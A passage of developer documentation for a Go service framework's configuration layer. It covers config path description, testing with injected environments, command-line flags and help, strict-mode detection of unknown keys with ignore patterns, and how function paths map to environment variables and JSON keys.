`json.File(...)` and `json.Raw(...)` do the same with document paths (`shop.api.tls.cert_file`).

- The path is an argument, so it needs no running service: use it in a test, or a small program, to print the variables a service reads, generate a `.env.example`, or fail CI when the example drifts from the struct. Inside a function, `f.Path()` is the path.
- Fields come back in declaration order. Groups are expanded and an embedded struct's fields are named as if declared in the parent; fields that are skipped (`-`), untagged or unexported are left out.
- It reads nothing (no environment, no file; a missing or invalid file is fine), leaves the struct alone, and doesn't count as asking for the keys, so it doesn't affect strict mode.
- Mistakes in the struct (an unsupported type, an unknown tag option) come back as the same `*config.FieldError`s that loading reports, alongside the fields that are fine.
- `Load` uses it to name the keys on a missing required field. A provider you write can opt in by implementing `Describe`; `config.Fields` does the struct walking.

Types, defaults and usage text are not part of it yet.

See `examples/config/names`.

## Testing

Code that calls `f.Load` can be tested without touching the real environment, so tests don't have to use `t.Setenv` and can run in parallel. Give each test its own source:

```go
vars := map[string]string{"SVC_HTTP_SERVER_ADDR": "127.0.0.1:0"}

foundation.Run("svc", fn, foundation.SetEnvironmentConfig(env.New(env.WithMap(vars))))
```

`WithMap` makes the map the whole environment: it answers lookups and is what [strict mode](#strict-mode) lists. For anything else, `WithLookup(fn)` replaces the lookup (`fn` has the shape of `os.LookupEnv`) and `WithEnviron(fn)` replaces the listing (`fn` returns `KEY=VALUE` entries, as `os.Environ` does), which is how you read variables from a prefix wrapper, a secrets store or a `.env` file.

`SetEnvironmentConfig` and `WithConfigProviders` are per run and nothing is global, so concurrent tests with different providers can't interfere. The JSON provider needs no equivalent: `json.Raw(data)` already takes the data directly.

## Command line flags

Fields opt in with the `flag` tag, and the program gives the framework its arguments, which are never taken from `os.Args` behind its back:

```go
type Config struct {
	Addr string `config:"addr" flag:"addr"`
	Port int    `config:"port" flag:"port,short=p"`
}

foundation.Run("svc", fn, foundation.WithArgs(os.Args[1:]))
```

With `WithArgs` the default providers are the environment, then flags, so flags win (a file named with `WithDocumentConfig` is below both). `--addr=:80`, `--addr :80`, `-p 8080` and `-p=8080` work; a bool is bare (`--verbose`) or `--verbose=false`. There are no clusters, attached values, abbreviations, `--` or case folding, and a value that starts with `-` needs the equals sign. Flags are never read from `os.Args` by the framework.

A function's flags come after its marker, its name as a flag: `--http --server --addr 127.0.0.1:8080` is the function `http.server` (split into words as for variables, lower case, underscores as hyphens), and the flags of the root function come first, with no marker. A flag belongs to the nearest marker before it, a scope ends at the first flag it doesn't have, and the same name under different parents (`--a --c`, `--b --c`) is different functions. When a marker could mean two functions it is an error. A tagged nested struct hyphenates (`flag:"db"` and `flag:"host"` give `--db-host`).

The root function has a flag of its own, `--dry-run` (the same as `WithDryRun`), which comes first, and a program can't claim that word in the root scope. `--help` and `-h` can be given anywhere and no function can claim them (see Help below).

Every argument must be read by something. When startup ends the framework fails the run for each one nothing read (a misspelt flag, a flag before its marker, a stray word), with or without strict mode, and `WithStrictIgnore` never covers them. Reports name the flag as written, never a value. A field that reads a secret from a file (`env:"PASSWORD,file"`) can't be a flag, because arguments are visible to every user of the machine. With `WithConfigProviders`, flags are not in the list unless `flags.New(flags.WithArgs(args))` is named there. `examples/config/flags` shows every feature and each kind of mistake, with the real HTTP server from `transport/http`, whose settings are all flags (`--http --server --help` lists them).

### Help

`--help` (or `-h`) prints what the program says about itself, then exits 0. A function says what it is for with `f.Help(text)` (the first line is its summary, the whole text is shown when help is asked for that function), and a field with the `help` tag; only fields with a `flag` tag are listed, so the program chooses what appears. Help shows flags only, not the environment variables or keys that can set the same fields, as that is long and is for the documentation:

The HTTP server and the health server describe themselves with `f.Help`, so `--help` shows a line on `--server` and `--health`, and `--http --server --help` and `--health --help` start with the whole text. `--http` has no text of its own: it is only the first word of the function `http.server`, so the description is on `--server`.

```go
type Config struct {
    Workers int `config:"workers" flag:"workers,short=w" help:"Requests handled at once."`
}

f.Help("Runs the API.\nRequests are handled by a pool of workers.")
f.Load(&cfg)
```

```
$ shop --help
The shop service.

  -h, --help           Show this help
      --dry-run        Check configuration and start nothing
--api                  Runs the API.
    -w, --workers int  Requests handled at once.
```

`shop --api --help` narrows to that function and what is under it, with its whole text. Help is a dry run that describes instead of reading: every function loads, but nothing is read from the environment or files (the other providers are only asked to describe their tags, so a mistake in one is still found), expanded, required or validated, and nothing starts (functions skip, as in a dry run), so it works with a broken or missing configuration. It never shows a default or a value. The arguments are parsed as in a real run, so a mistake in them (an unknown flag, a bad value) fails with exit status 1 and no help. Only warnings and errors are logged. Output goes to standard output, or to `WithHelpOutput(w)`; text that isn't printable (control characters, bidirectional overrides) is escaped; `f.Help` is limited to 16 KiB, a help tag to 1 KiB and the output to 1 MiB, and over a limit the run fails. Code after `Load` that isn't guarded by `f.DryRun()` still runs, with the defaults, as in a dry run. Providers describe themselves with `config.Describer`, which now also gives each `FieldKey` its `Provider`, `Help` and `Type` (`config.Annotate` fills them in for a new provider).

## Strict mode

A misspelt variable such as `APP_ADRR=:9`, or a misspelt key in `config.json`, is by default silently ignored: the service starts and runs on the default. With `foundation.WithStrictConfig()` it is a failure:

```go
foundation.Run("shop", fn, foundation.WithStrictConfig())
```
```
ERROR invalid configuration fn=shop provider=json key=shop.api.timeuot err="not recognised"
ERROR invalid configuration fn=shop provider=env key=SHOP_API_WORKRS err="not recognised"
ERROR shutting down due to failure fn=shop err="invalid configuration" count=2
```

`examples/config/strict` is a runnable service with a typo in each, which shows the service loading on the defaults and strict mode then catching both.

Every provider that can check (it implements `config.Checker`) records the keys that `f.Load` asked for, whether or not a value was set. When the root function returns, anything under the root's prefix (`SHOP_`) that nothing asked for is reported, one error each, and the run fails with exit status 1. They are `*config.FieldError`s wrapping `config.ErrUnknown`, with no `Field`.

- **It's tree-wide.** A `Load` only sees its own struct, and `SHOP_HTTP_SERVER_ADDR` belongs to a different function from `SHOP_`, so unknown can only be decided once every function has loaded. The end of the root function is treated as the end of startup, so **load configuration before calling `f.Parallel()`**, as the built in components do. A function that loads later has its variables reported as unknown.
- **It is opt-in.** Another program might legitimately use a variable that shares your prefix, or a file might hold keys for other programs (those outside your root's object are ignored) or comments such as `"_comment"` (those inside it are reported, as nothing reads them).
- **Keys that aren't typos** are listed with `foundation.WithStrictIgnore`; see below.
- A variable belonging to a function that never loads (a disabled feature, say) is reported too.
- The check is skipped if the run is already failing or shutting down. That includes a `Load` that found a problem with a value: the run stops there, so unknown variables are only reported once those are fixed. Checking anyway would flag every variable that belongs to a function that hasn't loaded yet.
- **Env:** the provider lists variables from the process environment, or from `WithEnviron` / `WithMap`, and reports every variable under the root's prefix that nothing asked for. With a custom `WithLookup` and no `WithEnviron`, it returns an error saying so rather than checking the wrong place.
- **JSON:** the provider walks the document under the root's object. A key is known if it is a field, or an object on the way to one (the objects of child functions that loaded). Keys are compared without regard to case and reported by their path in the document, `shop.api.timeuot`; for the `File` provider the message also names the file, `not recognised (in config.json)`. An object nothing asked for is **one** problem, not one per key inside it, which differs from env, where each variable is its own problem. What is inside a field's value is never examined: the entries of a map field are its value, not more configuration. The file is read again when checking, and one that is missing has nothing to report.

### Ignoring keys

`_comment` keys in a JSON document, or variables that belong to another program but share your prefix (`SHOP_LEGACY_MODE`), are reported like typos. List them in code:

```go
foundation.Run("shop", fn,
	foundation.WithStrictConfig(),
	foundation.WithStrictIgnore("*._comment", "SHOP_LEGACY_*"),
)
```

- **Patterns.** A pattern is compared with the whole key as it is reported: the variable name (`SHOP_LEGACY_MODE`) or the dotted path in the document (`shop.api._comment`). `*` stands for any run of characters, including none and including dots, so `*._comment` is a comment at any depth. Nothing else is special (`?`, `[a-z]`, `\` and `.` are ordinary characters), and matching is case sensitive, so a pattern that is slightly wrong reports more, never less. Write a JSON pattern spelt as the document spells the key.
- **An object is one key**, so `shop.legacy` ignores everything inside it.
- **Only "not recognised" can be ignored.** A value that is wrong, a missing required field or a file that can't be read is reported whatever the patterns say.
- **Nothing is hidden.** At the end of startup one `Info` line, `ignored unknown configuration`, gives the patterns in force and how many keys they covered (also when it is 0), and each key is logged at `Debug` as `ignored unknown key`, with control characters escaped.
- **The patterns are code.** They can't be set from the environment or the file, so whoever can change those can't widen them. A pattern that is empty, only stars, has control characters or invalid UTF-8, is over 256 bytes, or more than 64 patterns, stops `Run` with exit status 1 before the root function starts, with or without strict mode. A pattern that would match every key is the one mistake that silently turns the check off, which is why it is refused; a prefix such as `SHOP_*` is allowed and does the same for everything under the root, so keep patterns as narrow as the thing you mean.
- Matching is linear in the length of the key and bounded by the pattern limits, so a hostile key can't make it slow.

## How the path maps

Every provider follows one rule, so a value set in one format can be moved to another without changing where it lives:

1. `config.Keys(path)` splits each function name in the path into **keys** on every character that isn't an ASCII letter, digit or underscore. Empty keys are dropped. Case is preserved, and each provider decides how to match it (env uppercases, JSON compares case-insensitively).
2. The provider lays the keys out its own way: env joins them with `_`, JSON nests an object per key.

For this tree:

```go
foundation.Run("simple", func(f *foundation.F) {
	f.Run("a", func(f *foundation.F) {
		f.Run("a", func(f *foundation.F) { /* path: simple/a/a */ })
	})
	f.Run("http.server", func(f *foundation.F) { /* path: simple/http.server */ })
})
```

| Function | Path | Env prefix | JSON location |
|---|---|---|---|
| inner `a` | `simple/a/a` | `SIMPLE_A_A_` | `{"simple": {"a": {"a": {...}}}}` |
| `http.server` | `simple/http.server` | `SIMPLE_HTTP_SERVER_` | `{"simple": {"http": {"server": {...}}}}` |

So `http.server`, `http/server` and `http-server` all mean the same thing, and a node called `http.server` under `svc` reads `SVC_HTTP_SERVER_ADDR` and `svc.http.server.addr`. Struct fields follow the same pattern: a nested `TLS` struct with a `CERT_FILE` field reads `..._TLS_CERT_FILE` in env and `tls.cert_file` in JSON.

An underscore is **not** a separator, so it stays inside a key. `http_server` is a single key: JSON looks for the key `http_server`, while env, which can't tell an underscore from a separator, gives the same `HTTP_SERVER` as for `http.server`. Avoid names that differ only by `_` versus `.`.

Providers for new formats should call `config.Keys` rather than re-implement the rule, and `config/conformance_test.go` checks that the built in providers agree.

## Design notes

- **`Provider`, not `Configurator`.** The first idea was a `Configurator` interface returning a value (`Configure(dst any) any`). It became `Provider.Unmarshal(path, dst) error`: the provider gets the path so it can decide where to look, writes into the destination in place so that layering is just calling providers in order, and reports errors instead of returning a new value.
- **Dependencies point at `foundation`.** `config`, `config/env` and `config/json` are leaves that import nothing from the module. `Provider` takes the path as a plain `[]string`, which is what `f.Path()` returns, so it needs no framework type, and `Load` is a method on `*F` rather than a function in `config`. That lets `foundation` import `config` and the two built in providers for the defaults, without an import cycle.
- **Defaults are plain Go values.** There is no global state: the providers are an option on `Run`.

## Not built yet

- **A TOML provider.** The pipeline was designed for it: implement `Provider`, call `config.Fields` for the names, and put it in the document layer (`WithDocumentConfig`). Because it would pull in a third party dependency it should be a separate module, as the YAML one is, so the core stays dependency free. When it arrives, the walker that the JSON and YAML providers each carry (collisions, ambiguous keys, strict-mode keys) is worth sharing.
